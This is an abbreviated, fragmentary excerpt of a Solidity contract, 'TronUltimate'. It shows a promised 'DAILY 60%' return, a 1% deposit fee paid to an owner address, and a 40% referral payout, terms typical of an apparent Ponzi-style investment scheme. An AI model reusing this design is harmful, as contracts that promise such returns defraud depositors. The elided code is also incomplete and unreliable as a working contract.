//SourceUnit: tronultimate.sol

pragma solidity ^0.4.25;

contract TronUltimate {
    ...
    uint private minuteRate = 6944412; //DAILY 60%
    uint private releaseTime = 1593702000;
    address public feeOwn;
    address owner;
    ...
    constructor(address _feeOwn) public {
      owner = msg.sender;
      feeOwn = _feeOwn;
    }
    ...
    function deposit(address _affAddr) public payable {
        ...
        uint feeEarn = depositAmount.mul(1).div(100);
        feeOwn.transfer(feeEarn);
    ...
    function distributeRef(uint256 _trx, address _affFrom) private{
        ...
        uint256 _allaff = (_trx.mul(40)).div(100);
